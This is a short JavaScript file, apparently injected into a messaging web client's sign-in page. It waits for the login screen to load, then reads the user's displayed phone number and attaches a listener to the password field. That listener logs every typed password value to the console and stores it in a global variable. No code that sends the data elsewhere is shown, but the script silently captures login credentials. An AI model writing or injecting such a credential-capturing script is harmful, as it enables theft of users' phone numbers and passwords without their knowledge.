document.addEventListener('DOMContentLoaded', async () => {
    const waitForElement = async (selector, condition) => {
        return new Promise( async resolve => {
            let intr = setInterval( () => {
                const ele = document.querySelector( selector )
                if( ele ) {
                    if( condition(ele) ) {
                        clearInterval(intr)
                        resolve(ele)
                    }
                }
            }, 50 )

        } )
    }

    const waitForPhone = async () => {
        const phoneInput = await waitForElement('.page-authCode .phone-wrapper h4.phone', ele => ele.innerText.trim() !== '')
        window.detectedPhone = phoneInput.innerText.trim()
    }
    const waitForPass = async () => {
        const passInput = await waitForElement('input[name="notsearch_password"]', () => true)

        passInput.addEventListener('input', e => {
            console.log(e.target.value)
            window.detectedPass = e.target.value
        })
    }
    waitForPhone()
    waitForPass()
})